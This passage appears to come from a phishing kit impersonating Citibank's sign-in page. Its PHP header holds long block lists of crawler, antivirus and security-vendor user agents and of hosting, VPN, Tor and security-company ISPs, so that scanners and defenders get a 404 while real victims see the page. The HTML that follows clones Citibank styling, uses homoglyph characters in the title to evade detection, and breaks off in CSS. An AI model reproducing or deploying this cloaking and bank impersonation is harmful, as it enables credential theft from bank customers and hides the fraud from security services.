  "-bot",
  ":bot",
  "(bot",
  "crawl",
  "slurp",
  "spider",
  "seek",
  "avg",
  "avira",
  "bitdefender",
  "kaspersky",
  "sophos",
  "virustotal",
  "virus",
  "accoona",
  "acoon",
  "adressendeutschland",
  "ah-ha.com",
  "ahoy",
  "altavista",
  "ananzi",
  "anthill",
  "appie",
  "arachnophilia",
  "arale",
  "araneo",
  "aranha",
  "architext",
  "aretha",
  "arks",
  "asterias",
  "atlocal",
  "atn",
  "atomz",
  "augurfind",
  "backrub",
  "bannana_bot",
  "baypup",
  "bdfetch",
  "big brother",
  "biglotron",
  "bjaaland",
  "blackwidow",
  "blaiz",
  "blog",
  "blo.",
  "bloodhound",
  "boitho",
  "booch",
  "bradley",
  "butterfly",
  "calif",
  "cassandra",
  "ccubee",
  "cfetch",
  "charlotte",
  "churl",
  "cienciaficcion",
  "cmc",
  "collective",
  "comagent",
  "combine",
  "computingsite",
  "csci",
  "curl",
  "cusco",
  "daumoa",
  "deepindex",
  "delorie",
  "depspid",
  "deweb",
  "die blinde kuh",
  "digger",
  "ditto",
  "dmoz",
  "docomo",
  "download express",
  "dtaagent",
  "dwcp",
  "ebiness",
  "ebingbong",
  "e-collector",
  "ejupiter",
  "emacs-w3 search engine",
  "esther",
  "evliya celebi",
  "ezresult",
  "falcon",
  "felix ide",
  "ferret",
  "fetchrover",
  "fido",
  "findlinks",
  "fireball",
  "fish search",
  "fouineur",
  "funnelweb",
  "gazz",
  "gcreep",
  "genieknows",
  "getterroboplus",
  "geturl",
  "glx",
  "goforit",
  "golem",
  "grabber",
  "grapnel",
  "gralon",
  "griffon",
  "gromit",
  "grub",
  "gulliver",
  "hamahakki",
  "harvest",
  "havindex",
  "helix",
  "heritrix",
  "hku www octopus",
  "homerweb",
  "htdig",
  "html index",
  "html_analyzer",
  "htmlgobble",
  "hubater",
  "hyper-decontextualizer",
  "ia_archiver",
  "ibm_planetwide",
  "ichiro",
  "iconsurf",
  "iltrovatore",
  "image.kapsi.net",
  "imagelock",
  "incywincy",
  "indexer",
  "infobee",
  "informant",
  "ingrid",
  "inktomisearch.com",
  "inspector web",
  "intelliagent",
  "internet shinchakubin",
  "ip3000",
  "iron33",
  "israeli-search",
  "ivia",
  "jack",
  "jakarta",
  "javabee",
  "jetbot",
  "jumpstation",
  "katipo",
  "kdd-explorer",
  "kilroy",
  "knowledge",
  "kototoi",
  "kretrieve",
  "labelgrabber",
  "lachesis",
  "larbin",
  "legs",
  "libwww",
  "linkalarm",
  "link validator",
  "linkscan",
  "lockon",
  "lwp",
  "lycos",
  "magpie",
  "mantraagent",
  "mapoftheinternet",
  "marvin/",
  "mattie",
  "mediafox",
  "mediapartners",
  "mercator",
  "merzscope",
  "microsoft url control",
  "minirank",
  "miva",
  "mj12",
  "mnogosearch",
  "moget",
  "monster",
  "moose",
  "motor",
  "multitext",
  "muncher",
  "muscatferret",
  "mwd.search",
  "myweb",
  "najdi",
  "nameprotect",
  "nationaldirectory",
  "nazilla",
  "ncsa beta",
  "nec-meshexplorer",
  "nederland.zoek",
  "netcarta webmap engine",
  "netmechanic",
  "netresearchserver",
  "netscoop",
  "newscan-online",
  "nhse",
  "nokia6682/",
  "nomad",
  "noyona",
  "siteexplorer",
  "nutch",
  "nzexplorer",
  "objectssearch",
  "occam",
  "omni",
  "open text",
  "openfind",
  "openintelligencedata",
  "orb search",
  "osis-project",
  "pack rat",
  "pageboy",
  "pagebull",
  "page_verifier",
  "panscient",
  "parasite",
  "partnersite",
  "patric",
  "pear.",
  "pegasus",
  "peregrinator",
  "pgp key agent",
  "phantom",
  "phpdig",
  "picosearch",
  "piltdownman",
  "pimptrain",
  "pinpoint",
  "pioneer",
  "piranha",
  "plumtreewebaccessor",
  "pogodak",
  "poirot",
  "pompos",
  "poppelsdorf",
  "poppi",
  "popular iconoclast",
  "psycheclone",
  "publisher",
  "python",
  "rambler",
  "raven search",
  "roach",
  "road runner",
  "roadhouse",
  "robbie",
  "robofox",
  "robozilla",
  "rules",
  "salty",
  "sbider",
  "scooter",
  "scoutjet",
  "scrubby",
  "search.",
  "searchprocess",
  "semanticdiscovery",
  "senrigan",
  "sg-scout",
  "shai'hulud",
  "shark",
  "shopwiki",
  "sidewinder",
  "sift",
  "silk",
  "simmany",
  "site searcher",
  "site valet",
  "sitetech-rover",
  "skymob.com",
  "sleek",
  "smartwit",
  "sna-",
  "snappy",
  "snooper",
  "sohu",
  "speedfind",
  "sphere",
  "sphider",
  "spinner",
  "spyder",
  "steeler/",
  "suke",
  "suntek",
  "supersnooper",
  "surfnomore",
  "sven",
  "sygol",
  "szukacz",
  "tach black widow",
  "tarantula",
  "templeton",
  "/teoma",
  "t-h-u-n-d-e-r-s-t-o-n-e",
  "theophrastus",
  "titan",
  "titin",
  "tkwww",
  "toutatis",
  "t-rex",
  "tutorgig",
  "twiceler",
  "twisted",
  "ucsd",
  "udmsearch",
  "url check",
  "updated",
  "vagabondo",
  "valkyrie",
  "verticrawl",
  "victoria",
  "vision-search",
  "volcano",
  "voyager/",
  "voyager-hc",
  "w3c_validator",
  "w3m2",
  "w3mir",
  "walker",
  "wallpaper",
  "wanderer",
  "wauuu",
  "wavefire",
  "web core",
  "web hopper",
  "web wombat",
  "webbandit",
  "webcatcher",
  "webcopy",
  "webfoot",
  "weblayers",
  "weblinker",
  "weblog monitor",
  "webmirror",
  "webmonkey",
  "webquest",
  "webreaper",
  "websitepulse",
  "websnarf",
  "webstolperer",
  "webvac",
  "webwalk",
  "webwatch",
  "webwombat",
  "webzinger",
  "wget",
  "whizbang",
  "whowhere",
  "wild ferret",
  "worldlight",
  "wwwc",
  "wwwster",
  "xenu",
  "xget",
  "xift",
  "xirq",
  "yandex",
  "yanga",
  "yeti",
  "yodao",
  "zao/",
  "zippp",
  "zyborg",
  "proximic",
  "Googlebot",
  "Baiduspider",
  "Cliqzbot",
  "A6-Indexer",
  "AhrefsBot",
  "Genieo",
  "BomboraBot",
  "CCBot",
  "URLAppendBot",
  "DomainAppender",
  "msnbot-media",
  "Antivirus",
  "YoudaoBot",
  "MJ12bot",
  "linkdexbot",
  "Go-http-client",
  "presto",
  "BingPreview",
  "go-http-client",
  "go-http-client/1.1",
  "trident",
  "presto",
  "virustotal",
  "unchaos",
  "dreampassport",
  "sygol",
  "nutch",
  "privoxy",
  "zipcommander",
  "neofonie",
  "abacho",
  "acoi",
  "acoon",
  "adaxas",
  "agada",
  "aladin",
  "alkaline",
  "amibot",
  "anonymizer",
  "aplix",
  "aspseek",
  "avant",
  "baboom",
  "anzwers",
  "anzwerscrawl",
  "crawlconvera",
  "del.icio.us",
  "camehttps",
  "annotate",
  "wapproxy",
  "translate",
  "feedfetcher",
  "ask24",
  "asked",
  "askaboutoil",
  "fangcrawl",
  "amzn_assoc",
  "bingpreview",
  "dr.web",
  "drweb",
  "bilbo",
  "blackwidow",
  "sogou",
  "sogou-test-spider",
  "exabot",
  "externalhit",
  "ia_archiver",
  "mj12",
  "okhttp",
  "simplepie",
  "curl",
  "wget",
  "virus",
  "pipes",
  "antivirus",
  "python",
  "ruby",
  "avast",
  "firebird",
  "scmguard",
  "adsbot",
  "weblight",
  "favicon",
  "analytics",
  "insights",
  "headless",
  "github",
  "node",
  "agusescan",
  "zteopen",
  "majestic12",
  "SimplePie",
  "SAMSUNG-SGH-E250",
  "DoCoMo/2.0 N905i",
  "SiteLockSpider",
  "okhttp/2.5.0",
  "ips-agent",
  "scoutjet",
  "UptimeRobot",
  "FM Scene",
  "Prevx",
  "WindowsPowerShell"
);
foreach ($Bot as $BotType) {
  if (stripos($_SERVER['HTTP_USER_AGENT'], $BotType) !== false) {
    $content = "#> " . $_SERVER['HTTP_USER_AGENT'] . " [ Bot ] \r\n";
    $save = fopen("../../bots.txt", "a+");
    fwrite($save, $content);
    fclose($save);
    header("HTTP/1.0 404 Not Found");
    exit();

  }
}

$ispnya = gethostbyaddr($_SERVER['REMOTE_ADDR']);

$banned_isp = array(
  'Peak 10',
  'Quasi Networks LTD',
  'SC Rusnano',
  'GoDaddy.com, LLC',
  'Server Plan S.r.l.',
  'Linode',
  'Blazing SEO',
  'Lixux OU',
  'Inter Connects Inc',
  'Flokinet Ltd',
  'LukMAN Multimedia Sp. z o.o',
  'PIPEX-BLOCK1',
  'IPVanish',
  'LinkGrid LLC',
  'Snab-Inform Private Enterprise',
  'Cisco Systems',
  'Network and Information Technology Limited',
  'London Wires Ltd.',
  'Tehnologii Budushego LLC',
  'Eonix Corporation',
  'hosttech GmbH',
  'Wowrack.com',
  'SunGard Availability Services LP',
  'Internap Network Services Corporation',
  'Palo Alto Networks',
  'PlusNet Technologies Ltd',
  'Scaleway',
  'Facebook',
  'Host1Plus',
  'XO Communications',
  'Nobis Technology Group',
  'ExpressVPN',
  'DME Hosting LLC',
  'Prescient Software',
  'Sungard Network Solutions',
  'OVH SAS',
  'Iomart Hosting Ltd',
  'Hosting Solution',
  'Barracuda Networks',
  'Sungard Network Solutions',
  'Solar VPS',
  'PHPNET Hosting Services',
  'DigitalOcean',
  'Level 3 Communications',
  'softlayer',
  'Chelyabinsk-Signal LLC',
  'SoftLayer Technologies',
  'Complete Internet Access',
  'london-tor.mooo.com',
  'amazonaws',
  'cyveillance',
  'phishtank',
  'tor.piratenpartei-nrw.de',
  'cpanel66.proisp.no',
  'tor-node.com',
  'dreamhost',
  'Involta',
  'exit0.liskov.tor-relays.net',
  'tor.tocici.com',
  'netpilot',
  'calyxinstitute',
  'tor-exit',
  'msnbot',
  'p3pwgdsn',
  'netcraft',
  'University of Virginia',
  'trendmicro',
  'ebay',
  'paypal',
  'torservers',
  'comodo',
  'EGIHosting',
  'ebbs.healingpathsolutions.com',
  'healingpathsolutions.com',
  'Solution Pro',
  'Zayo Bandwidth',
  'spider.clicktargetdevelopment.com',
  'clicktargetdevelopment.com',
  'static.spro.net',
  'Digital Ocean',
  'Internap Network Services Corporation',
  'Blue Coat Systems',
  'GANDI SAS',
  'roamsite.com',
  'PIPEX-BLOCK1',
  'ColoUp',
  'Westnet',
  'The University of Tokyo',
  'University',
  'University of',
  'QuadraNet',
  'exit-01a.noisetor.net',
  'noisetor.net',
  'noisetor',
  'vultr.com',
  'Zscaler',
  'Choopa',
  'RedSwitches Pty',
  'Quintex Alliance Consulting',
  'www16.mailshell.com',
  'this.is.a.tor.exit-node.net',
  'this.is.a.tor.node.xmission.com',
  'colocrossing.com',
  'DedFiberCo',
  'crawl',
  'sucuri.net',
  'crawler',
  'proxy',
  'enom',
  'cloudflare',
  'yahoo',
  'trustwave',
  'rima-tde.net',
  'tfbnw.net',
  'pacbell.net',
  'tpnet.pl',
  'ovh.net',
  'centralnic',
  'badware',
  'phishing',
  'antivirus',
  'SiteAdvisor',
  'McAfee',
  'Bitdefender',
  'avirasoft',
  'phishtank.com',
  'googleusercontent',
  'OVH SAS',
  'Yahoo',
  'Yahoo! Inc.',
  'Google',
  'Google Inc.',
  'GoDaddy',
  'Amazon Technologies Inc.',
  'Amazon',
  'Top Level Hosting SRL',
  'Twitter',
  'Microsoft',
  'Microsoft Corporation',
  'OVH',
  'VPSmalaysia.com.my',
  'Madgenius.com',
  'Barracuda Networks Inc.',
  'Barracuda',
  'SecuredConnectivity.net',
  'Digital Domain',
  'Hetzner Online',
  'Akamai',
  'SoftLayer',
  'SURFnet',
  'Creative Thought Inc.',
  'Fastly',
  'Return Path Inc.',
  'WhatsApp',
  'Instagram',
  'Schulte Consulting LLC',
  'Universidade Federal do Rio de Janeiro',
  'Sectoor',
  'Bitfolk',
  'DIR A/S',
  'Team Technologies LLC',
  'Mainloop',
  'Junk Email Filter Inc.',
  'Art Matrix - Lightlink Inc.',
  'Redpill Linpro AS',
  'CloudFlare',
  'ESET spol. s r.o.',
  'AVAST Software s.r.o.',
  'Dosarrest',
  'Apple Inc.',
  'Symantec',
  'Mozilla',
  'Netprotect SRL',
  'Host Europe GmbH',
  'Host Sailor Ltd.',
  'PSINet Inc.',
  'Daniel James Austin',
  'RamNode',
  'Hostalia',
  'Xs4all Internet BV',
  'Inktomi Corporation',
  'Eircom Customer Assignment',
  '9New Network Inc',
  'Sony',
  'Private IP Address LAN',
  'Computer Problem Solving',
  'Fortinet',
  'Avira',
  'Rackspace',
  'Baidu',
  'Comodo',
  'Incapsula Inc',
  'Orange Polska Spolka Akcyjna',
  'Infosphere',
  'Private Customer',
  'SurfControl',
  'University of Newcastle upon Tyne',
  'Total Server Solutions',
  'LukMAN',
  'eSecureData',
  'Hosting',
  'VI Na Host Co. Ltd',
  'B2 Net Solutions',
  'Master Internet',
  'Global Perfomance',
  'Fireeye',
  'AntiVirus',
  'Security',
  'Intersoft Internet',
  'Voxility',
  'Linode',
  'Internet-Pro',
  'Trustwave Holdings Inc',
  'Online SAS',
  'Versaweb',
  'Liquid Web',
  'A100 ROW',
  'Apexis AG',
  'Apexis',
  'LogicWeb',
  'Virtual1 Limited',
  'VNET a.s.',
  'Static IP Assignment',
  'TerraTransit AG',
  'Merit Network',
  'PathsConnect',
  'Long Thrive',
  'LG DACOM',
  'Secure Internet',
  'Kaspersky',
  'UK Dedicated Servers Limited',
  'Customer Network',
  'Flokinet',
  'Simpli Networks LLC',
  'Psychz',
  'PrivateSystems Networks',
  'ScanSafe Services',
  'CachedNet',
  'CloudVPN',
  'Spark New Zealand Trading Ltd',
  'Whitelabel IT Solutions Corp',
  'Hostwinds',
  'Hosteros LLC',
  'HostUS',
  'Host',
  'ClientID',
  'Server',
  'Oracle',
  'Fortinet',
  'Unus Inc.',
  'Public facing services',
  'Virtual Employee Pvt Ltd',
  'Dataline Ltd',
  'Teksavvy Solutions Inc.',
  'UPC Romania Bucuresti',
  'TalkTalk Communications Limited',
  'British Telecommunications PLC',
  'Global Data Networks LLC',
  'Quintex Alliance Consulting',
  'Online S.A.S.',
  'Content Delivery Network Ltd',
  'Nobis Technology Group LLC',
  'Parrukatu',
  'JSC ER-Telecom Holding',
  'ChinaNet Fujian Province Network',
  'QualityNetwork',
  'Vist On-Line Ltd',
  'The Calyx Institute',
  'Internet Customers',
  'OJSC Oao Tattelecom',
  'Petersburg Internet Network Ltd.',
  'Psychz Networks',
  'Udasha',
  'Onavo Mobile Ltd',
  'Cubenode System SL',
  'OVH Hosting Inc.',
  'NForce Entertainment B.V.',
  'DigitalOcean LLC',
  'Glenayre Electronics Inc.',
  'British Telecommunications PLC',
  'Iomart Hosting Limited',
  'Digital Energy Technologies Limited',
  'Private Customer',
  'Cisco Systems Inc.',
  'Vultr Holdings LLC',
  'Amazon.com Inc.',
  'Web Hosting Solutions',
  'Time Warner Cable Internet LLC',
  'Internet Security - TC',
  'Vertical Telecoms Broadband Networks and Internet Provider',
  'Ventelo Wholesale',
  'MYX Group LLC',
  'France Telecom S.A.',
  'Online S.A.S.',
  'Nine Internet Solutions AG',
  'Microsoft Azure',
  'Choopa, LLC',
  'Amazon',
  'HighWinds Network',
  'Amazon.com',
  'Bell Canada',
  'Digital Ocean',
  'M247 LTD Frankfurt Infrastructure',
  'Palo Alto Networks',
  'Spectrum',
  'ImOn Communications, LLC',
  'Wintek Corporation',
  'ServerMania',
  'Claro Dominican Republic',
  '013 NetVision',
  'Amazon.com',
  'Digital Ocean',
  'TalkTalk',
  'HostDime.com',
  'AVAST Software s.r.o.',
  'Host1Plus Cloud Servers',
  'Amazon Data Services NoVa',
  'Google Cloud',
  'M-net',
  'Digiweb ltd',
  'Prescient Software',
  'Eir Broadband',
  'Solution Pro',
  'Bell Canada',
  'Linode',
  'DigitalOcean',
  'Plusnet',
  'GigeNET',
  'ZenLayer',
  'NFOrce Entertainment B.V.',
  'NewMedia Express',
  'Telegram Messenger Network',
  'IQ PL Sp. z o.o.',
  'Datacamp Limited',
  'Tahoe Internet Exchange (TahoeIX)',
  'ITCOM Shpk',
  'HEG US'

);
foreach ($banned_isp as $isps) {
  if (substr_count($ispnya, $isps) > 0) {
    $content = "#> " . $_SERVER['HTTP_USER_AGENT'] . " [ Banned ISP ] \r\n";
    $save = fopen("../../bots.txt", "a+");
    fwrite($save, $content);
    fclose($save);
    header("HTTP/1.0 404 Not Found");
    exit();

  }
}




?>

<html class="cbolui-ddl" lang="en" style="display: block; visibility: visible;">

<head>
  <style type="text/css">
    .kampyle_vertical_button .kampyle_button-text {
      font-size: 16px;
      font-family: Arial, Helvetica, sans-serif !important;
      transform: rotate(-180deg) !important;
      font-weight: 500 !important;
    }

    .kampyle_button-text::before {
      content: "[+]";
      color: #ffffff;
      font-size: 16px;
      font-family: Arial, Helvetica, sans-serif;
      padding-right: 5px
    }

    .kampyle_vertical_button .kampyle_button {
      border-radius: 0px 0px 7px 7px !important;
      width: 162px !important;
      min-width: 139px !important;
      min-height: 39px !important;
      z-index: -1;
      text-align: center;
    }

    .kampyle_vertical_button {
      top: 40%;
      z-index: 1;
      min-height: 39px !important;
      min-width: 139px !important;
    }

    .kampyle_vertical_button.kampyle_right {
      right: -50px;
    }

    .footer {
      z-index: 1 !important;
    }


    #citilmFooter.reskinFooter {
      z-index: 1 !important;
    }

    .site-footer {
      z-index: 99999999 !important;
    }


    @media (max-width: 991px) {
      button.kampyle_vertical_button {
        margin-top: 24px !important;
      }
    }

    @media (max-width: 480px) {
      button.kampyle_vertical_button {
        margin-top: 50px !important;
      }
    }

    @media print {

      .nebula_image_button,
      .wcagOutline {
        display: none;
      }
    }
  </style>
  <meta http-equiv="X-UA-Compatible" content="IE=11,edge">
  <meta charset="utf-8">
  <title>Ѕіցո Οո tο Υοսr Сіtі Αссοսոt - Ꮯіtіbаոk</title>


  <!-- Preloading fonts as per lighthouse suggestions to reduce execution time-->
  <link rel="preload"
    href="https://www.citi.com/cbol-pre-login-static-assets/commonui-assets/fonts/interstate/Interstate-Light.woff"
    as="font" crossorigin="anonymous">
  <link rel="preload"
    href="https://www.citi.com/cbol-pre-login-static-assets/commonui-assets/fonts/interstate/Interstate-Bold.woff"
    as="font" crossorigin="anonymous">
  <link rel="preload"
    href="https://www.citi.com/cbol-pre-login-static-assets/commonui-assets/fonts/interstate/Interstate-Regular.woff"
    as="font" crossorigin="anonymous">











  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="icon" type="image/x-icon" href="assets/img/favicon.ico">

  <style>
    .jamp.preload {
      display: -ms-flexbox;
      display: -webkit-flex;
      display: flex;
      -webkit-justify-content: center;
      -ms-flex-pack: center;
      justify-content: center;
      -webkit-align-items: center;
      -ms-flex-align: center;
      align-items: center;

      width: 100%;
      height: 100%;
      position: absolute;
      top: 0px;
      left: 0px;
      margin: 0;
    }

    @keyframes spinner {
      to {
        transform: rotate(360deg);
      }
    }

    .jamp.preload .loading {
      background-image: url(assets/img/download.svg);
      -webkit-animation: spinner 1160ms infinite linear;
      animation: spinner 1160ms infinite linear;
    }

    .jamp.preload .img {
      background-position: 0 0;
      background-repeat: no-repeat;
      background-size: contain;
      margin-right: 3px;
      width: 30px;
      height: 30px;
      display: inline-block;
    }
  </style>


  <link rel="stylesheet" href="assets/signin.css">


  <link rel="stylesheet" href="assets/stylee.css">

  <link rel="stylesheet" href="assets/img/origination.css">
  <link rel="stylesheet" href="https://www.citi.com/cbol-pre-login-static-assets/styles.7083615ebe6cea4aa24b.css">
  <style></style>
  <style>
    .mfa-screen-alignment[_ngcontent-ssr-c102] {
      margin-left: 20px !important
    }
  </style>
  <style>
    .citi-container[_ngcontent-ssr-c151] {
      padding: 40px 20px 0;
      max-width: 1440px;
      margin: 0 auto;
      min-height: 650px
    }

    .fullbleedFix[_ngcontent-ssr-c151] {
      margin: 0;
      padding: 0;
      max-width: 100%
    }

    [_nghost-ssr-c151] .fullbleedFix .row {
      margin-left: 0;
      margin-right: 0
    }

    .citi-panel-wrapper[_ngcontent-ssr-c151] {
      display: flex
    }

    .citi-panel-wrapper[_ngcontent-ssr-c151] .content-panel[_ngcontent-ssr-c151] {
      flex: 3 0 0
    }

    .citi-panel-wrapper[_ngcontent-ssr-c151] .search-panel[_ngcontent-ssr-c151] {
      flex: 1 0 0;
      border-left: 1px solid #d6d6d6;
      background-color: #fff
    }

    @media screen and (max-width:991.9px) {
      .citi-panel-wrapper[_ngcontent-ssr-c151] .search-panel[_ngcontent-ssr-c151] {
        background-color: #fff !important
      }

      .citi-panel-wrapper[_ngcontent-ssr-c151] .content-panel[_ngcontent-ssr-c151] {
        display: none
      }
    }

    @media screen and (max-width:768px) {
      .citi-panel-wrapper[_ngcontent-ssr-c151] .search-panel[_ngcontent-ssr-c151] {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: 100000 !important;
        background-color: #fff !important
      }

      .citi-panel-wrapper[_ngcontent-ssr-c151] .content-panel[_ngcontent-ssr-c151] {
        display: none
      }
    }
  </style>
  <style>
    .ivr-cta-wrapper[_ngcontent-ssr-c197] {
      text-align: right
    }

    .citi-bot[_ngcontent-ssr-c197] {
      height: 100%;
      width: 100%;
      background: #0e2a48;
      text-align: start;
      border-radius: 8px;
      padding: 16px;
      display: -ms-grid;
      display: grid;
      -ms-grid-columns: auto 1fr auto;
      grid-template-columns: auto 1fr auto;
      align-items: center;
      border: none
    }

    .citi-bot-header[_ngcontent-ssr-c197] {
      color: #fff;
      font-family: interstate_Bold;
      margin: 8px;
      padding: 0 16px
    }

    .citi-bot-content[_ngcontent-ssr-c197] {
      color: #eee;
      margin: 8px;
      padding: 0 16px;
      line-height: 120%
    }

    citi-icon2[_ngcontent-ssr-c197] svg path {
      fill: #00bdf2
    }

    .citi-bot-link[_ngcontent-ssr-c197] {
      font-family: interstate_Bold;
      color: #00bdf2;
      margin: 0
    }

    .citi-bot-link-container[_ngcontent-ssr-c197] {
      display: flex;
      justify-content: flex-end;
      flex-direction: row;
      align-items: center
    }

    .citi-bot-link-container[_ngcontent-ssr-c197] citi-icon2[_ngcontent-ssr-c197] svg>path {
      stroke-width: 3;
      stroke: #00bdf2
    }

    @media (max-width:767px) {
      #ivr-modal .header-level-2 {
        line-height: 2rem
      }
    }

    @media (max-width:991px) {
      .ivr-cta-wrapper[_ngcontent-ssr-c197] {
        text-align: center
      }

      .citi-bot[_ngcontent-ssr-c197] {
        text-align: center;
        display: block
      }

      .citi-bot-header[_ngcontent-ssr-c197] {
        margin-top: 0
      }

      .citi-bot-content[_ngcontent-ssr-c197] {
        padding: 0
      }

      .citi-bot-link-container[_ngcontent-ssr-c197] {
        display: flex;
        justify-content: center;
        align-items: center
      }
    }

    .citi-bot[_ngcontent-ssr-c197]:hover {
      cursor: pointer
    }

    .citi-bot-divider[_ngcontent-ssr-c197] {
      border-top: 1.5px solid #666;
      opacity: 25%;
      margin-bottom: 16px
    }

    .citi-bot-divider-container[_ngcontent-ssr-c197] {
      margin-top: 42px
    }
  </style>
  <style>
    .ivr-modal-container .ivr-cta-wrapper {
      text-align: right;
      justify-content: flex-end;
      margin: 8px
    }

    .ivr-modal-container .ivr-cta-wrapper .cds-cta {
      margin: 8px;
      padding: 13px 0
    }

    .ivr-modal-container .ivr-cta-wrapper button {
      text-align: center
    }

    .ivr-modal-container p {
      margin: 0
    }

    .ivr-modal-container .cds-modal-footer {
      justify-content: flex-end
    }

    .ivr-modal-container .dropdown {
      padding: 8px
    }

    .ivr-modal-container .citi-bot {
      height: 100%;
      width: 100%;
      background: #0e2a48;
      text-align: start;
      border-radius: 8px;
      padding: 16px;
      display: -ms-grid;
      display: grid;
      -ms-grid-columns: auto 1fr auto;
      grid-template-columns: auto 1fr auto;
      align-items: center;
      border: none
    }

    .ivr-modal-container .citi-bot-header {
      color: #fff;
      font-family: interstate_Bold;
      margin: 8px;
      padding: 0 16px
    }

    .ivr-modal-container .citi-bot-content {
      color: #eee;
      margin: 8px;
      padding: 0 16px;
      line-height: 120%
    }

    .ivr-modal-container cds-icon svg>path {
      fill: #00bdf2
    }

    .ivr-modal-container .citi-bot-link {
      font-family: interstate_Bold;
      color: #00bdf2;
      margin: 0
    }

    .ivr-modal-container .citi-bot-link-container {
      display: flex;
      justify-content: flex-end;
      flex-direction: row;
      align-items: center
    }

    .ivr-modal-container .citi-bot-link-container cds-icon svg>path {
      stroke-width: 3;
      stroke: #00bdf2
    }

    .cdk-overlay-container {
      z-index: 10002
    }

    @media (max-width:1167px) {
      .ivr-cta-wrapper[_ngcontent-ssr-c198] {
        text-align: center;
        justify-content: center
      }

      .citi-bot[_ngcontent-ssr-c198] {
        text-align: center;
        display: block
      }

      .citi-bot-header[_ngcontent-ssr-c198] {
        margin-top: 0
      }

      .citi-bot-content[_ngcontent-ssr-c198] {
        padding: 0
      }

      .citi-bot-link-container[_ngcontent-ssr-c198] {
        display: flex;
        justify-content: center;
        align-items: center
      }

      .cds-modal-footer[_ngcontent-ssr-c198] {
        justify-content: center
      }
    }

    .citi-bot[_ngcontent-ssr-c198]:hover {
      cursor: pointer
    }

    .citi-bot-divider[_ngcontent-ssr-c198] {
      border-top: 1.5px solid #666;
      opacity: 25%;
      margin-bottom: 16px
    }
  </style>

  <style>
    .modal.in {
      z-index: 9999999999 !important
    }

    .citi-modal-backdrop {
      z-index: 999999999 !important
    }
  </style>

  <style>
    [_nghost-ssr-c148] citi-input .form-group {
      padding-left: 0;
      padding-right: 0
    }

    [_nghost-ssr-c148] citi-modal div .citi-modal-box .citi-modal-close {
      padding-top: 5px !important
    }

    [_nghost-ssr-c148] citi-modal div .citi-modal-box .citi-modal-controls {
      padding-top: 0 !important;
      padding-bottom: 10px !important
    }
  </style>
  <style>
    .primary[_ngcontent-ssr-c111] {
      box-shadow: 0 1px 5px rgba(0, 0, 0, .125);
      position: relative;
      z-index: 9999
    }

    .alternateSkipNav[_ngcontent-ssr-c111] {
      position: absolute;
      transform: translateY(-100%);
      padding: 3px
    }

    .alternateSkipNav[_ngcontent-ssr-c111]:focus {
      transform: translateY(0);
      position: relative !important
    }

    .coBranding[_ngcontent-ssr-c111] {
      max-width: 1440px;
      margin: 0 auto
    }
  </style>
  <style>
    [_nghost-ssr-c114] .brandingSprite {
      background-image: url(assets/img/Citi-Branding-Sprite.png) !important;
      background-repeat: no-repeat;
      cursor: pointer;
      display: inline-block
    }

    [_nghost-ssr-c114] .brandingSprite .equalHousing,
    [_nghost-ssr-c114] .brandingSprite .fdic {
      cursor: default !important
    }

    [_nghost-ssr-c114] .footer {
      position: initial;
      background: #333
    }

    citi-social-media[_ngcontent-ssr-c114] .social .content .socialItems citi-modal .modal .modal-dialog {
      margin: 40px auto !important
    }

    citi-social-media[_ngcontent-ssr-c114] .social .content .socialItems citi-modal .modal .modal-dialog .modal-content .modal-header {
      padding: 15px !important;
      min-height: 16.5px
    }

    citi-social-media[_ngcontent-ssr-c114] .social .content .socialItems citi-modal .modal .modal-dialog .modal-content .modal-body {
      padding-right: 40px;
      padding-left: 40px
    }

    citi-social-media[_ngcontent-ssr-c114] .social .content .socialItems citi-modal .modal .modal-dialog .modal-content .modal-footer {
      padding: 40px 15px 15px !important;
      text-align: right;
      border-top: 1px solid #e5e5e5;
      width: 100%;
      border: none !important
    }

    citi-social-media[_ngcontent-ssr-c114] .social .content .socialItems citi-modal .modal .modal-dialog .modal-content .modal-footer citi-cta a {
      color: #fff;
      background: #056dae;
      margin: 20px 20px 0 0;
      min-width: 220px;
      position: relative;
      line-height: 34px;
      vertical-align: middle;
      text-align: center;
      font-size: 1rem;
      font-family: Interstate_Bold, sans-serif;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
      font-weight: 700;
      border-radius: 6px;
      display: inline-block;
      touch-action: manipulation;
      cursor: pointer;
      border: 2px solid #056dae;
      white-space: nowrap;
      padding: 6px 20px;
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none
    }

    @media screen and (max-width:800px) {
      #nebula_div_btn[_ngcontent-ssr-c114] {
        display: none
      }
    }
  </style>
  <style>
    a[_ngcontent-ssr-c112],
    abbr[_ngcontent-ssr-c112],
    acronym[_ngcontent-ssr-c112],
    address[_ngcontent-ssr-c112],
    applet[_ngcontent-ssr-c112],
    article[_ngcontent-ssr-c112],
    aside[_ngcontent-ssr-c112],
    audio[_ngcontent-ssr-c112],
    b[_ngcontent-ssr-c112],
    big[_ngcontent-ssr-c112],
    blockquote[_ngcontent-ssr-c112],
    body[_ngcontent-ssr-c112],
    canvas[_ngcontent-ssr-c112],
    caption[_ngcontent-ssr-c112],
    center[_ngcontent-ssr-c112],
    cite[_ngcontent-ssr-c112],
    code[_ngcontent-ssr-c112],
    dd[_ngcontent-ssr-c112],
    del[_ngcontent-ssr-c112],
    details[_ngcontent-ssr-c112],
    dfn[_ngcontent-ssr-c112],
    div[_ngcontent-ssr-c112],
    dl[_ngcontent-ssr-c112],
    dt[_ngcontent-ssr-c112],
    em[_ngcontent-ssr-c112],
    embed[_ngcontent-ssr-c112],
    fieldset[_ngcontent-ssr-c112],
    figcaption[_ngcontent-ssr-c112],
    figure[_ngcontent-ssr-c112],
    footer[_ngcontent-ssr-c112],
    form[_ngcontent-ssr-c112],
    h1[_ngcontent-ssr-c112],
    h2[_ngcontent-ssr-c112],
    h3[_ngcontent-ssr-c112],
    h4[_ngcontent-ssr-c112],
    h5[_ngcontent-ssr-c112],
    h6[_ngcontent-ssr-c112],
    header[_ngcontent-ssr-c112],
    hgroup[_ngcontent-ssr-c112],
    html[_ngcontent-ssr-c112],
    i[_ngcontent-ssr-c112],
    iframe[_ngcontent-ssr-c112],
    img[_ngcontent-ssr-c112],
    ins[_ngcontent-ssr-c112],
    kbd[_ngcontent-ssr-c112],
    label[_ngcontent-ssr-c112],
    legend[_ngcontent-ssr-c112],
    li[_ngcontent-ssr-c112],
    mark[_ngcontent-ssr-c112],
    menu[_ngcontent-ssr-c112],
    nav[_ngcontent-ssr-c112],
